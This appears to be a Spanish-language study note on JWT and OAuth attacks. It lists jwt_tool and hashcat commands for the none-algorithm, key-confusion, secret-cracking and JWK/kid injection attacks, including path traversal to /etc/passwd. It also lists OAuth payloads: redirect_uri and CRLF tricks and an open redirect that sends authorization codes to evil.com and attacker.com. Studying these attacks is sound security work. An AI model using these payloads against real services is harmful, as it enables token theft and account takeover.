---
tags: [web, oauth, jwt, auth]
status: done
---

# OAuth y JWT

---

## JWT — Estructura

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (base64)
.eyJ1c2VyIjoiYWRtaW4ifQ==             ← Payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Firma

# Decodificar
echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
# → {"user":"admin"}
```

---

## JWT Ataques

### None Algorithm

```python
# Cambiar alg a "none" y eliminar la firma
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "superadmin"}

# Herramienta: jwt_tool
python3 jwt_tool.py <token> -X a
```

### HS256 → RS256 Confusion (Algorithm Confusion)

```
# Si el server acepta RS256 pero también HS256:
# Firmar el token con la clave pública RSA como si fuera clave HMAC
python3 jwt_tool.py <token> -X k -pk public_key.pem
```

### Weak Secret Brute Force

```bash
# hashcat
hashcat -a 0 -m 16500 <token> wordlist.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d wordlist.txt

# Si se encuentra el secret → firmar token modificado
```

### JWK Header Injection

```
# Meter clave pública propia en el header JWK
# El servidor usa esa clave para verificar → firma con tu clave privada
python3 jwt_tool.py <token> -X i
```

### Kid Injection

```
# "kid" (key ID) en header apunta al archivo de clave
# Si se puede controlar:
{"kid": "../../dev/null"}    # clave = string vacío → firmar con ""
{"kid": "../../etc/passwd"}  # clave = contenido de passwd
```

---

## JWT Herramientas

```bash
# jwt_tool — todo en uno
python3 jwt_tool.py <token>           # inspeccionar
python3 jwt_tool.py <token> -T        # tamper (editor interactivo)
python3 jwt_tool.py <token> -X a      # none algorithm
python3 jwt_tool.py <token> -C -d w   # crack secret

# Burp Extension: JWT Editor — integrado en Burp para editar/atacar JWTs
```

---

## OAuth 2.0 — Flujo Básico

```
1. App → redirige usuario a:
   https://auth.server.com/authorize?
     client_id=CLIENT_ID
     &redirect_uri=https://app.com/callback
     &response_type=code
     &scope=read
     &state=RANDOM_STATE

2. Usuario autoriza → auth server redirige a:
   https://app.com/callback?code=AUTH_CODE&state=RANDOM_STATE

3. App intercambia code por token:
   POST /token
   {client_id, client_secret, code, redirect_uri}
   → {access_token, refresh_token}
```

---

## OAuth Ataques

### CSRF en OAuth (state ausente o fijo)

```
1. Iniciar el flujo de OAuth en tu cuenta
2. Capturar la URL de callback con el código
3. Enviar esa URL a la víctima
4. Si no hay validación de "state" → vincula TU cuenta OAuth con LA SUYA
→ login como víctima con tus credenciales OAuth
```

### redirect_uri Manipulation

```
# Si acepta subdominios o variaciones:
redirect_uri=https://app.com.evil.com/callback
redirect_uri=https://app.com/callback/../evil
redirect_uri=https://app.com/callback%0d%0aLocation:https://evil.com

# El código de autorización va a tu servidor → intercambias por token
```

### Token Leakage via Referer

```
# Si el access_token llega en la URL (response_type=token)
# Y la página tiene recursos externos → el token va en Referer header
```

### Open Redirect + OAuth

```
# redirect_uri debe ser dominio registrado PERO hay open redirect en ese dominio
redirect_uri=https://app.com/redirect?url=https://attacker.com
# El código llega a attacker.com via redirect
```

